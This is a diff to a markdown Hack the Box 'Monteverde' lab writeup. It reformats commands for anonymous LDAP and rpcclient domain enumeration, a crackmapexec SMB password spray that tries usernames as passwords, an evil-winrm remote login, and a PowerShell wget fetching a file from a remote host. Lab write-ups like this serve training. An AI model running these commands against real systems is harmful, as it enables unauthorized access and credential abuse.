@@ -6,6 +6,8 @@ title: Hack the Box - Monteverde Writeup
 date: 2020-05-30 08:00:00 -0600
 categories: [Hack the Box, Writeup]
 tags: [htb, hacking, hack the box, redteam, windows, ldap, rpc, smb, powershell, azure, medium, writeup, egre55, unfinished]     # TAG names should always be lowercase
+show_image_post: true
+image: /assets/img/Screenshot-at-2020-06-13-00-54-41.png
 ---
 
 # HTB - Monteverde
@@ -21,34 +23,42 @@ Short description to include any strange things to be dealt with...when there is
 
 ### Using ldapsearch to enumerate a Windows domain
 
-`ldapsearch -H ldap://$ip:$port -x -LLL -s sub -b "DC=$domain,DC=local"`
+```bash
+ldapsearch -H ldap://$ip:$port -x -LLL -s sub -b "DC=$domain,DC=local"
+```
 
 ### Enumerating users on a Windows domain with rpcclient \(without credentials\)
 
-> ```
-> rpcclient -U "" -N $ip
->
-> rpcclient: enumdomusers
-> rpcclient: queryuser $user_RID;
-> rpcclient: enumalsgroups builtin
-> rpcclient: queryaliasmem builtin $RID;
->
->           sid:\[S-1-5-21-391775091-850290835-3566037492-1601\]
->
-> rpcclient: queryuser 1601
-> ```
+```bash
+rpcclient -U "" -N $ip
+
+rpcclient: enumdomusers
+rpcclient: queryuser $user_RID;
+rpcclient: enumalsgroups builtin
+rpcclient: queryaliasmem builtin $RID;
+
+         sid:\[S-1-5-21-391775091-850290835-3566037492-1601\]
+
+rpcclient: queryuser 1601
+```
 
 ### Bruteforcing SMB login with only usernames
 
-`crackmapexec smb 10.10.10.172 -u users.txt -p users.txt`
+```bash
+crackmapexec smb $ip -u $users.txt -p $users.txt
+```
 
 ### Connect to a Windows computer through Windows Remote Management \(WinRM\)
 
-`evil-winrm -i <ip> -u <username> -p '<password>'`
+```bash
+evil-winrm -i $ip -u $username -p $password
+```
 
 ### Use PowerShell Invoke-WebRequest \(alias: wget\) to download a file from a remote host
 
-`wget http://<ip>:<port>/<file_to_get> -UseBasicParsing -Outfile <file_to_save>`
+```powershell
+wget http://$ip:$port/$file_to_get -UseBasicParsing -Outfile $file_to_save
+```
 
 ### Useful Windows groups
 
